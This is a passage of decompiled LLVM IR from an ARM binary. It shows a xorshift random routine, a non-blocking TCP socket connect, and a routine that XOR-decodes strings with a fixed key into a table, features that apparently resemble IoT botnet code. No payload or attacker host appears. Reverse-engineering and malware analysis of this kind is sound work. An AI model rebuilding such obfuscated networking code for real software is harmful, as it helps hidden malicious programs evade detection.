  br i1 %v9_f7d4, label %dec_label_pc_f7dc, label %dec_label_pc_f77c.dec_label_pc_f77c_crit_edge

dec_label_pc_f77c.dec_label_pc_f77c_crit_edge:    ; preds = %dec_label_pc_f77c
  %v1_f7a0.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f77c

dec_label_pc_f7dc:                                ; preds = %dec_label_pc_f77c, %dec_label_pc_f730
  %v1_f7e0 = call i32 @function_11294(i32 28)
  %v2_f7e8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f7e8, i32* @r4, align 4
  store i32 %v6_f730, i32* @r5, align 4
  store i32 %v9_f730, i32* @r6, align 4
  store i32 %v12_f730, i32* @r7, align 4
  ret i32 %v1_f7e0

; uselistorder directives
  uselistorder i32 %v2_f780, { 1, 0 }
  uselistorder i32 %v2_f77c, { 1, 0, 2 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
}

define i32 @function_f7fc(i8* %arg1) local_unnamed_addr {
dec_label_pc_f7fc:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-36 = alloca i32, align 4
  %v3_f7fc = load i32, i32* @r4, align 4
  store i32 %v3_f7fc, i32* %stack_var_-36, align 4
  %v9_f7fc = load i32, i32* @r6, align 4
  %v12_f7fc = load i32, i32* @r7, align 4
  %v15_f7fc = load i32, i32* @r8, align 4
  %v18_f7fc = load i32, i32* @sb, align 4
  %v21_f7fc = load i32, i32* @sl, align 4
  %v24_f7fc = load i32, i32* @fp, align 4
  %v0_f800 = load i32, i32* @r1, align 4
  store i32 %v0_f800, i32* %r4.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  %tmp20 = icmp slt i32 %v0_f800, 1
  br i1 %tmp20, label %bb, label %bb21

bb:                                               ; preds = %dec_label_pc_f7fc
  store i32 %v3_f7fc, i32* @r4, align 4
  ret i32 %tmp

bb21:                                             ; preds = %dec_label_pc_f7fc
  store i32 ptrtoint (i32* @global_var_1a3e4.164 to i32), i32* %fp.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a3e0.168 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a3dc.166 to i32), i32* %sl.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1a3d8.162 to i32), i32* %r8.global-to-local, align 4
  %v2_f81c = load i32, i32* @global_var_1a3e4.164, align 4
  store i32 %v2_f81c, i32* %lr.global-to-local, align 4
  %v2_f820 = load i32, i32* @global_var_1a3e0.168, align 4
  store i32 %v2_f820, i32* %r7.global-to-local, align 4
  %v2_f824 = load i32, i32* @global_var_1a3dc.166, align 4
  store i32 %v2_f824, i32* %r6.global-to-local, align 4
  %v2_f828 = load i32, i32* @global_var_1a3d8.162, align 4
  br label %dec_label_pc_f854

dec_label_pc_f830:                                ; preds = %dec_label_pc_f880
  %v3_f888 = sdiv i32 %v5_f86c, 256
  %v1_f830 = trunc i32 %v3_f888 to i8
  %v3_f830 = add i32 %v9_f874, 1
  %v4_f830 = inttoptr i32 %v3_f830 to i8*
  store i8 %v1_f830, i8* %v4_f830, align 1
  %v0_f834 = load i32, i32* %r3.global-to-local, align 4
  %v1_f834 = trunc i32 %v0_f834 to i8
  %v2_f834 = load i32, i32* %r5.global-to-local, align 4
  %v3_f834 = inttoptr i32 %v2_f834 to i8*
  store i8 %v1_f834, i8* %v3_f834, align 1
  %v0_f838 = load i32, i32* %r5.global-to-local, align 4
  %v1_f838 = add i32 %v0_f838, 2
  store i32 %v1_f838, i32* %r5.global-to-local, align 4
  %v0_f83c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f83c

dec_label_pc_f83c:                                ; preds = %.thread, %dec_label_pc_f830
  %v0_f83c = phi i32 [ %v9_f878, %.thread ], [ %v0_f83c.pre, %dec_label_pc_f830 ]
  %v2_f8307 = phi i32 [ %v12_f874, %.thread ], [ %v1_f838, %dec_label_pc_f830 ]
  %tmp22 = icmp slt i32 %v0_f83c, 1
  br i1 %tmp22, label %dec_label_pc_f8bc, label %dec_label_pc_f848

dec_label_pc_f848:                                ; preds = %dec_label_pc_f83c
  %v0_f840 = load i32, i32* %r6.global-to-local, align 4
  %v0_f848 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_f848, i32* %r6.global-to-local, align 4
  %v0_f84c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_f84c, i32* %r7.global-to-local, align 4
  %v0_f850 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_f850, i32* %lr.global-to-local, align 4
  br label %dec_label_pc_f854

dec_label_pc_f854:                                ; preds = %bb21, %dec_label_pc_f848
  %v0_f8a4 = phi i32 [ %v2_f824, %bb21 ], [ %v0_f848, %dec_label_pc_f848 ]
  %v9_f874 = phi i32 [ %tmp, %bb21 ], [ %v2_f8307, %dec_label_pc_f848 ]
  %v0_f88c = phi i32 [ %v0_f800, %bb21 ], [ %v0_f83c, %dec_label_pc_f848 ]
  %v0_f898 = phi i32 [ %v2_f81c, %bb21 ], [ %v0_f850, %dec_label_pc_f848 ]
  %v0_f894 = phi i32 [ %v2_f828, %bb21 ], [ %v0_f840, %dec_label_pc_f848 ]
  %v4_f854 = mul i32 %v0_f894, 2048
  %v5_f854 = xor i32 %v4_f854, %v0_f894
  %v4_f858 = udiv i32 %v0_f898, 524288
  %v5_f858 = xor i32 %v4_f858, %v0_f898
  %v2_f85c = xor i32 %v5_f858, %v5_f854
  %v4_f86c = udiv i32 %v5_f854, 256
  %v5_f86c = xor i32 %v4_f86c, %v2_f85c
  store i32 %v5_f86c, i32* %r3.global-to-local, align 4
  %v7_f874 = icmp sgt i32 %v0_f88c, 3
  br i1 %v7_f874, label %.thread, label %dec_label_pc_f880

.thread:                                          ; preds = %dec_label_pc_f854
  %v10_f874 = inttoptr i32 %v9_f874 to i32*
  store i32 %v5_f86c, i32* %v10_f874, align 4
  %v11_f874 = load i32, i32* %r5.global-to-local, align 4
  %v12_f874 = add i32 %v11_f874, 4
  store i32 %v12_f874, i32* %r5.global-to-local, align 4
  %v8_f878 = load i32, i32* %r4.global-to-local, align 4
  %v9_f878 = add i32 %v8_f878, -4
  store i32 %v9_f878, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_f83c

dec_label_pc_f880:                                ; preds = %dec_label_pc_f854
  store i32 %v5_f86c, i32* %r3.global-to-local, align 4
  %v7_f884 = icmp eq i32 %v0_f88c, 1
  %v1_f88c = add i32 %v0_f88c, -2
  store i32 %v1_f88c, i32* %r4.global-to-local, align 4
  br i1 %v7_f884, label %dec_label_pc_f894, label %dec_label_pc_f830

dec_label_pc_f894:                                ; preds = %dec_label_pc_f880
  store i32 %v5_f86c, i32* %r3.global-to-local, align 4
  %v1_f8a4 = load i32, i32* %r8.global-to-local, align 4
  %v2_f8a4 = inttoptr i32 %v1_f8a4 to i32*
  store i32 %v0_f8a4, i32* %v2_f8a4, align 4
  %v0_f8a8 = load i32, i32* %r7.global-to-local, align 4
  %v1_f8a8 = load i32, i32* %sl.global-to-local, align 4
  %v2_f8a8 = inttoptr i32 %v1_f8a8 to i32*
  store i32 %v0_f8a8, i32* %v2_f8a8, align 4
  %v0_f8ac = load i32, i32* %lr.global-to-local, align 4
  %v1_f8ac = load i32, i32* %sb.global-to-local, align 4
  %v2_f8ac = inttoptr i32 %v1_f8ac to i32*
  store i32 %v0_f8ac, i32* %v2_f8ac, align 4
  %v0_f8b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8b0 = load i32, i32* %fp.global-to-local, align 4
  %v2_f8b0 = inttoptr i32 %v1_f8b0 to i32*
  store i32 %v0_f8b0, i32* %v2_f8b0, align 4
  %v0_f8b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_f8b4 = trunc i32 %v0_f8b4 to i8
  %v2_f8b4 = load i32, i32* %r5.global-to-local, align 4
  %v3_f8b4 = inttoptr i32 %v2_f8b4 to i8*
  store i8 %v1_f8b4, i8* %v3_f8b4, align 1
  %v2_f8b8 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f8b8, i32* @r4, align 4
  store i32 %v9_f7fc, i32* @r6, align 4
  store i32 %v12_f7fc, i32* @r7, align 4
  store i32 %v15_f7fc, i32* @r8, align 4
  store i32 %v18_f7fc, i32* @sb, align 4
  store i32 %v21_f7fc, i32* @sl, align 4
  store i32 %v24_f7fc, i32* @fp, align 4
  ret i32 %v5_f854

dec_label_pc_f8bc:                                ; preds = %dec_label_pc_f83c
  %v0_f8bc = load i32, i32* %r3.global-to-local, align 4
  %v1_f8bc = load i32, i32* %fp.global-to-local, align 4
  %v2_f8bc = inttoptr i32 %v1_f8bc to i32*
  store i32 %v0_f8bc, i32* %v2_f8bc, align 4
  %v0_f8c0 = load i32, i32* %lr.global-to-local, align 4
  %v1_f8c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_f8c0 = inttoptr i32 %v1_f8c0 to i32*
  store i32 %v0_f8c0, i32* %v2_f8c0, align 4
  %v0_f8c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_f8c4 = load i32, i32* %sl.global-to-local, align 4
  %v2_f8c4 = inttoptr i32 %v1_f8c4 to i32*
  store i32 %v0_f8c4, i32* %v2_f8c4, align 4
  %v0_f8c8 = load i32, i32* %r6.global-to-local, align 4
  %v1_f8c8 = load i32, i32* %r8.global-to-local, align 4
  %v2_f8c8 = inttoptr i32 %v1_f8c8 to i32*
  store i32 %v0_f8c8, i32* %v2_f8c8, align 4
  %v2_f8cc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_f8cc, i32* @r4, align 4
  store i32 %v9_f7fc, i32* @r6, align 4
  store i32 %v12_f7fc, i32* @r7, align 4
  store i32 %v15_f7fc, i32* @r8, align 4
  store i32 %v18_f7fc, i32* @sb, align 4
  store i32 %v21_f7fc, i32* @sl, align 4
  store i32 %v24_f7fc, i32* @fp, align 4
  ret i32 %v5_f854

; uselistorder directives
  uselistorder i32 %v9_f878, { 1, 0 }
  uselistorder i32 %v12_f874, { 1, 0 }
  uselistorder i32 %v5_f86c, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v5_f854, { 1, 2, 0, 3 }
  uselistorder i32 %v0_f894, { 1, 0 }
  uselistorder i32 %v0_f898, { 1, 0 }
  uselistorder i32 %v0_f83c, { 1, 0 }
  uselistorder i32 %v24_f7fc, { 1, 0 }
  uselistorder i32 %v21_f7fc, { 1, 0 }
  uselistorder i32 %v18_f7fc, { 1, 0 }
  uselistorder i32 %v15_f7fc, { 1, 0 }
  uselistorder i32 %v12_f7fc, { 1, 0 }
  uselistorder i32 %v9_f7fc, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 5, 0, 3, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 5, 0, 1, 2, 4, 7, 6, 3 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* @global_var_1a3d8.162, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1a3d8.162 to i32), { 1, 0, 2 }
  uselistorder i32* @global_var_1a3dc.166, { 2, 3, 6, 4, 1, 0, 5 }
  uselistorder i32* @global_var_1a3e0.168, { 2, 3, 5, 1, 0, 4 }
  uselistorder i32* @global_var_1a3e4.164, { 2, 3, 5, 1, 0, 4 }
  uselistorder label %dec_label_pc_f854, { 1, 0 }
}

define i32 @function_f8e0() local_unnamed_addr {
dec_label_pc_f8e0:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f8e0 = load i32, i32* @r4, align 4
  store i32 %v3_f8e0, i32* %stack_var_-16, align 4
  %v0_f8e4 = load i32, i32* @r0, align 4
  store i32 %v0_f8e4, i32* %r5.global-to-local, align 4
  %v1_f8e8 = add i32 %v0_f8e4, 4
  %v2_f8e8 = inttoptr i32 %v1_f8e8 to i32*
  %v3_f8e8 = load i32, i32* %v2_f8e8, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v1_f908 = icmp ne i32 %v3_f8e8, -1
  call void @__pseudo_cond_branch(i1 %v1_f908, i32 ptrtoint (i32* @global_var_8d7c.157 to i32))
  %v3_f918 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_f918, i32* %r3.global-to-local, align 4
  %v2_f920 = icmp eq i32 %v3_f918, -1
  store i32 256, i32* @r1, align 4
  %v0_f928 = load i32, i32* %r5.global-to-local, align 4
  %v1_f928 = add i32 %v0_f928, 28
  store i32 %v1_f928, i32* @r0, align 4
  %v2_f92c = add i32 %v0_f928, 4
  %v3_f92c = inttoptr i32 %v2_f92c to i32*
  store i32 %v3_f918, i32* %v3_f92c, align 4
  br i1 %v2_f920, label %dec_label_pc_f8e0.dec_label_pc_f9a8_crit_edge, label %dec_label_pc_f934

dec_label_pc_f8e0.dec_label_pc_f9a8_crit_edge:    ; preds = %dec_label_pc_f8e0
  %v14_f9ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f9a8

dec_label_pc_f934:                                ; preds = %dec_label_pc_f8e0
  %v0_f934 = load i32, i32* %r6.global-to-local, align 4
  %v1_f934 = load i32, i32* %r5.global-to-local, align 4
  %v2_f934 = add i32 %v1_f934, 24
  %v3_f934 = inttoptr i32 %v2_f934 to i32*
  store i32 %v0_f934, i32* %v3_f934, align 4
  %v0_f938 = call i32 @function_11838()
  %v0_f93c = load i32, i32* %r5.global-to-local, align 4
  %v1_f93c = add i32 %v0_f93c, 4
  %v2_f93c = inttoptr i32 %v1_f93c to i32*
  %v3_f93c = load i32, i32* %v2_f93c, align 4
  %v2_f94c = call i32 (i32, i32, ...) @fcntl(i32 %v3_f93c, i32 3)
  %v2_f95c = call i32 (i32, i32, ...) @fcntl(i32 %v3_f93c, i32 4)
  store i32 ptrtoint (i32* @global_var_1a41c.182 to i32), i32* %r3.global-to-local, align 4
  %v0_f964 = load i32, i32* %r5.global-to-local, align 4
  %v2_f968 = load i32, i32* @global_var_1a41c.182, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_f974 = add i32 %v0_f964, 8
  %v3_f974 = inttoptr i32 %v2_f974 to i32*
  store i32 %v2_f968, i32* %v3_f974, align 4
  %v0_f978 = load i32, i32* %r3.global-to-local, align 4
  %v1_f978 = load i32, i32* %r5.global-to-local, align 4
  %v2_f978 = add i32 %v1_f978, 12
  %v3_f978 = inttoptr i32 %v2_f978 to i32*
  store i32 %v0_f978, i32* %v3_f978, align 4
  %v0_f980 = load i32, i32* %r5.global-to-local, align 4
  %v1_f980 = add i32 %v0_f980, 4
  %v2_f980 = inttoptr i32 %v1_f980 to i32*
  %v3_f980 = load i32, i32* %v2_f980, align 4
  %v0_f984 = load i32, i32* %r3.global-to-local, align 4
  %v2_f984 = mul i32 %v0_f984, 2
  store i32 %v2_f984, i32* %r3.global-to-local, align 4
  %tmp13 = bitcast i32* %stack_var_-32 to %sockaddr*
  store i32 %v2_f984, i32* %stack_var_-32, align 4
  %v5_f9a4 = call i32 @connect(i32 %v3_f980, %sockaddr* %tmp13, i32 16)
  br label %dec_label_pc_f9a8

dec_label_pc_f9a8:                                ; preds = %dec_label_pc_f8e0.dec_label_pc_f9a8_crit_edge, %dec_label_pc_f934
  %v14_f9ac = phi i32 [ %v14_f9ac.pre, %dec_label_pc_f8e0.dec_label_pc_f9a8_crit_edge ], [ %v5_f9a4, %dec_label_pc_f934 ]
  %v2_f9ac = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f9ac, i32* @r4, align 4
  ret i32 %v14_f9ac

; uselistorder directives
  uselistorder i32 %v2_f984, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 5, 4, 3, 6 }
  uselistorder i32 ()* @function_11838, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f9a8, { 1, 0 }
}

define i32 @function_f9b4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_f9b4:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1a3e8.184 to i32), i32* %r8.global-to-local, align 4
  %v2_f9bc = load i32, i32* @global_var_1a3e8.184, align 4
  store i32 ptrtoint (i32* @global_var_1a414.186 to i32), i32* %sb.global-to-local, align 4
  %v3_f9c8 = mul i32 %v2_f9bc, 16
  store i32 %v3_f9c8, i32* %r3.global-to-local, align 4
  %v3_f9d0 = urem i32 %arg3, 65536
  store i32 %v3_f9d0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_f9dc = load i32, i32* @global_var_1a414.186, align 4
  %v1_f9e0 = add i32 %v3_f9c8, 16
  store i32 %v1_f9e0, i32* %r1.global-to-local, align 4
  store i32 %v3_f9d0, i32* %stack_var_-44, align 4
  %v15_f9e8 = inttoptr i32 %v2_f9dc to i32*
  %v16_f9e8 = call i32* @realloc(i32* %v15_f9e8, i32 %v1_f9e0)
  %v18_f9e8 = ptrtoint i32* %v16_f9e8 to i32
  store i32 %v18_f9e8, i32* %sl.global-to-local, align 4
  %v0_f9f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_f9f4 = load i32, i32* %sb.global-to-local, align 4
  %v2_f9f4 = inttoptr i32 %v1_f9f4 to i32*
  store i32 %v18_f9e8, i32* %v2_f9f4, align 4
  %v2_f9f8 = load i32, i32* @global_var_1a3e8.184, align 4
  store i32 %v2_f9f8, i32* %fp.global-to-local, align 4
  %v1_f9fc = inttoptr i32 %v0_f9f0 to i8*
  %v2_f9fc = call i32 @function_11798(i8* %v1_f9fc)
  %sext = mul i32 %v2_f9fc, 16777216
  %v1_fa00 = sdiv i32 %sext, 16777216
  %v2_fa00 = add nsw i32 %v1_fa00, 1
  store i32 %v1_fa00, i32* %r7.global-to-local, align 4
  %v1_fa0c = call i32* @malloc(i32 %v2_fa00)
  %v3_fa0c = ptrtoint i32* %v1_fa0c to i32
  %v0_fa10 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_fa10, i32* %r1.global-to-local, align 4
  store i32 %v2_fa00, i32* %r2.global-to-local, align 4
  store i32 %v3_fa0c, i32* %r6.global-to-local, align 4
  %v3_fa1c = call i32 @function_11814(i32 %v3_fa0c, i32 %v0_fa10, i32 %v2_fa00)
  %v0_fa20 = load i32, i32* %r7.global-to-local, align 4
  %tmp21 = icmp slt i32 %v0_fa20, 1
  %extract.t6 = trunc i32 %v0_fa20 to i8
  br i1 %tmp21, label %dec_label_pc_fa44, label %dec_label_pc_fa28

dec_label_pc_fa28:                                ; preds = %dec_label_pc_f9b4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fa2c

dec_label_pc_fa2c:                                ; preds = %dec_label_pc_fa2c, %dec_label_pc_fa28
  %v2_fa34 = phi i32 [ %v1_fa38, %dec_label_pc_fa2c ], [ 0, %dec_label_pc_fa28 ]
  %v1_fa2c = load i32, i32* %r6.global-to-local, align 4
  %v2_fa2c = add i32 %v1_fa2c, %v2_fa34
  %v3_fa2c = inttoptr i32 %v2_fa2c to i8*
  %v4_fa2c = load i8, i8* %v3_fa2c, align 1
  %v6_fa2c = zext i8 %v4_fa2c to i32
  %v1_fa30 = xor i32 %v6_fa2c, 84
  store i32 %v1_fa30, i32* %r3.global-to-local, align 4
  %v1_fa34 = trunc i32 %v1_fa30 to i8
  store i8 %v1_fa34, i8* %v3_fa2c, align 1
  %v0_fa38 = load i32, i32* %r2.global-to-local, align 4
  %v1_fa38 = add i32 %v0_fa38, 1
  store i32 %v1_fa38, i32* %r2.global-to-local, align 4
  %v0_fa3c = load i32, i32* %r7.global-to-local, align 4
  %v9_fa3c = icmp eq i32 %v0_fa3c, %v1_fa38
  br i1 %v9_fa3c, label %dec_label_pc_fa44.loopexit, label %dec_label_pc_fa2c

dec_label_pc_fa44.loopexit:                       ; preds = %dec_label_pc_fa2c
  %extract.t = trunc i32 %v1_fa38 to i8
  br label %dec_label_pc_fa44

dec_label_pc_fa44:                                ; preds = %dec_label_pc_fa44.loopexit, %dec_label_pc_f9b4
  %v0_fa54.off0 = phi i8 [ %extract.t, %dec_label_pc_fa44.loopexit ], [ %extract.t6, %dec_label_pc_f9b4 ]
  %v2_fa44 = load i32, i32* @global_var_1a3e8.184, align 4
  %v2_fa48 = load i32, i32* @global_var_1a414.186, align 4
  store i32 %v2_fa48, i32* %r2.global-to-local, align 4
  %v3_fa4c = mul i32 %v2_fa44, 16
  %v2_fa50 = add i32 %v2_fa48, %v3_fa4c
  store i32 %v2_fa50, i32* %r3.global-to-local, align 4
  %v3_fa54 = add i32 %v2_fa50, 12
  %v4_fa54 = inttoptr i32 %v3_fa54 to i8*
  store i8 %v0_fa54.off0, i8* %v4_fa54, align 1
  %v0_fa58 = load i32, i32* %r6.global-to-local, align 4
  %v1_fa58 = load i32, i32* %sl.global-to-local, align 4
  %v2_fa58 = load i32, i32* %fp.global-to-local, align 4
  %v5_fa58 = mul i32 %v2_fa58, 16
  %v6_fa58 = add i32 %v5_fa58, %v1_fa58
  %v7_fa58 = inttoptr i32 %v6_fa58 to i32*
  store i32 %v0_fa58, i32* %v7_fa58, align 4
  %v2_fa60 = load i32, i32* @global_var_1a3e8.184, align 4
  store i32 %v2_fa60, i32* %r7.global-to-local, align 4
  %v2_fa64 = load i32, i32* @global_var_1a414.186, align 4
  store i32 %v2_fa64, i32* %sl.global-to-local, align 4
  %v1_fa68 = inttoptr i32 %arg2 to i8*
  %v2_fa68 = call i32 @function_11798(i8* %v1_fa68)
  %sext1 = mul i32 %v2_fa68, 16777216
  %v1_fa6c = sdiv i32 %sext1, 16777216
  %v2_fa6c = add nsw i32 %v1_fa6c, 1
  store i32 %v1_fa6c, i32* %r5.global-to-local, align 4
  %v1_fa78 = call i32* @malloc(i32 %v2_fa6c)
  %v3_fa78 = ptrtoint i32* %v1_fa78 to i32
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %v2_fa6c, i32* %r2.global-to-local, align 4
  store i32 %v3_fa78, i32* %r6.global-to-local, align 4
  %v3_fa88 = call i32 @function_11814(i32 %v3_fa78, i32 %arg2, i32 %v2_fa6c)
  %v0_fa8c = load i32, i32* %r5.global-to-local, align 4
  %tmp22 = icmp slt i32 %v0_fa8c, 1
  %extract.t8 = trunc i32 %v0_fa8c to i8
  br i1 %tmp22, label %dec_label_pc_fab0, label %dec_label_pc_fa94

dec_label_pc_fa94:                                ; preds = %dec_label_pc_fa44
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fa98

dec_label_pc_fa98:                                ; preds = %dec_label_pc_fa98, %dec_label_pc_fa94
  %v2_faa0 = phi i32 [ %v1_faa4, %dec_label_pc_fa98 ], [ 0, %dec_label_pc_fa94 ]
  %v1_fa98 = load i32, i32* %r6.global-to-local, align 4
  %v2_fa98 = add i32 %v1_fa98, %v2_faa0
  %v3_fa98 = inttoptr i32 %v2_fa98 to i8*
  %v4_fa98 = load i8, i8* %v3_fa98, align 1
  %v6_fa98 = zext i8 %v4_fa98 to i32
  %v1_fa9c = xor i32 %v6_fa98, 84
  store i32 %v1_fa9c, i32* %r3.global-to-local, align 4
  %v1_faa0 = trunc i32 %v1_fa9c to i8
  store i8 %v1_faa0, i8* %v3_fa98, align 1
  %v0_faa4 = load i32, i32* %r2.global-to-local, align 4
  %v1_faa4 = add i32 %v0_faa4, 1
  store i32 %v1_faa4, i32* %r2.global-to-local, align 4
  %v0_faa8 = load i32, i32* %r5.global-to-local, align 4
  %v9_faa8 = icmp eq i32 %v0_faa8, %v1_faa4
  br i1 %v9_faa8, label %dec_label_pc_fab0.loopexit, label %dec_label_pc_fa98

dec_label_pc_fab0.loopexit:                       ; preds = %dec_label_pc_fa98
  %extract.t7 = trunc i32 %v1_faa4 to i8
  br label %dec_label_pc_fab0

dec_label_pc_fab0:                                ; preds = %dec_label_pc_fab0.loopexit, %dec_label_pc_fa44
  %v0_fac0.off0 = phi i8 [ %extract.t7, %dec_label_pc_fab0.loopexit ], [ %extract.t8, %dec_label_pc_fa44 ]
  %v2_fab0 = load i32, i32* @global_var_1a3e8.184, align 4
  %v2_fab4 = load i32, i32* @global_var_1a414.186, align 4
  %v3_fab8 = mul i32 %v2_fab0, 16
  %v2_fabc = or i32 %v3_fab8, 13
  %v3_fac0 = add i32 %v2_fabc, %v2_fab4
  %v4_fac0 = inttoptr i32 %v3_fac0 to i8*
  store i8 %v0_fac0.off0, i8* %v4_fac0, align 1
  %v2_fac8 = load i32, i32* @global_var_1a3e8.184, align 4
  store i32 %v2_fac8, i32* %lr.global-to-local, align 4
  %v4_facc = load i8, i8* @global_var_1a419.189, align 1
  %v5_facc = zext i8 %v4_facc to i32
  %v3_fad0 = load i8, i8* bitcast (i8** @global_var_1a418.188 to i8*), align 4
  %v4_fad0 = zext i8 %v3_fad0 to i32
  %v2_fad4 = load i32, i32* @global_var_1a414.186, align 4
  %v4_fad8 = mul nuw nsw i32 %v5_facc, 256
  %v5_fad8 = or i32 %v4_fad0, %v4_fad8
  store i32 %v5_fad8, i32* %r2.global-to-local, align 4
  %v3_fadc = mul i32 %v2_fac8, 16
  %v2_fae0 = add i32 %v2_fad4, %v3_fadc
  store i32 %v2_fae0, i32* %r1.global-to-local, align 4
  %v3_fae8 = add i32 %v2_fae0, 9
  %v4_fae8 = inttoptr i32 %v3_fae8 to i8*
  store i8 %v4_facc, i8* %v4_fae8, align 1
  %v0_faec = load i32, i32* %r2.global-to-local, align 4
  %v1_faec = trunc i32 %v0_faec to i8
  %v2_faec = load i32, i32* %r1.global-to-local, align 4
  %v3_faec = add i32 %v2_faec, 8
  %v4_faec = inttoptr i32 %v3_faec to i8*
  store i8 %v1_faec, i8* %v4_faec, align 1
  %v4_faf0 = load i8, i8* @global_var_1a419.189, align 1
  %v5_faf0 = zext i8 %v4_faf0 to i32
  %v3_faf4 = load i8, i8* bitcast (i8** @global_var_1a418.188 to i8*), align 4
  %v4_faf4 = zext i8 %v3_faf4 to i32
  %v4_faf8 = mul nuw nsw i32 %v5_faf0, 256
  %v5_faf8 = or i32 %v4_faf4, %v4_faf8
  %v2_fafc = load i32, i32* %stack_var_-44, align 4
  %v2_fb00 = add i32 %v5_faf8, %v2_fafc
  store i32 %v2_fb00, i32* %r3.global-to-local, align 4
  %v3_fb049 = udiv i32 %v2_fb00, 256
  %v1_fb08 = trunc i32 %v3_fb049 to i8
  %v2_fb08 = load i32, i32* %r1.global-to-local, align 4
  %v3_fb08 = add i32 %v2_fb08, 11
  %v4_fb08 = inttoptr i32 %v3_fb08 to i8*
  store i8 %v1_fb08, i8* %v4_fb08, align 1
  %v0_fb0c = load i32, i32* %r3.global-to-local, align 4
  %v1_fb0c = trunc i32 %v0_fb0c to i8
  %v2_fb0c = load i32, i32* %r1.global-to-local, align 4
  %v3_fb0c = add i32 %v2_fb0c, 10
  %v4_fb0c = inttoptr i32 %v3_fb0c to i8*
  store i8 %v1_fb0c, i8* %v4_fb0c, align 1
  %v4_fb10 = load i8, i8* @global_var_1a419.189, align 1
  %v5_fb10 = zext i8 %v4_fb10 to i32
  %v3_fb14 = load i8, i8* bitcast (i8** @global_var_1a418.188 to i8*), align 4
  %v4_fb14 = zext i8 %v3_fb14 to i32
  %v4_fb18 = mul nuw nsw i32 %v5_fb10, 256
  %v5_fb18 = or i32 %v4_fb14, %v4_fb18
  %v2_fb1c = load i32, i32* %stack_var_-44, align 4
  %v2_fb20 = add i32 %v5_fb18, %v2_fb1c
  store i32 %v2_fb20, i32* %r2.global-to-local, align 4
  %v0_fb24 = load i32, i32* %r7.global-to-local, align 4
  %v3_fb24 = mul i32 %v0_fb24, 16
  %v1_fb28 = load i32, i32* %sl.global-to-local, align 4
  %v2_fb28 = add i32 %v1_fb28, %v3_fb24
  store i32 %v2_fb28, i32* %r3.global-to-local, align 4
  %v0_fb2c = load i32, i32* %lr.global-to-local, align 4
  %v1_fb2c = add i32 %v0_fb2c, 1
  store i32 %v1_fb2c, i32* %lr.global-to-local, align 4
  %v3_fb30 = sdiv i32 %v2_fb20, 256
  store i32 %v3_fb30, i32* %r1.global-to-local, align 4
  %v0_fb34 = load i32, i32* %r6.global-to-local, align 4
  %v2_fb34 = add i32 %v2_fb28, 4
  %v3_fb34 = inttoptr i32 %v2_fb34 to i32*
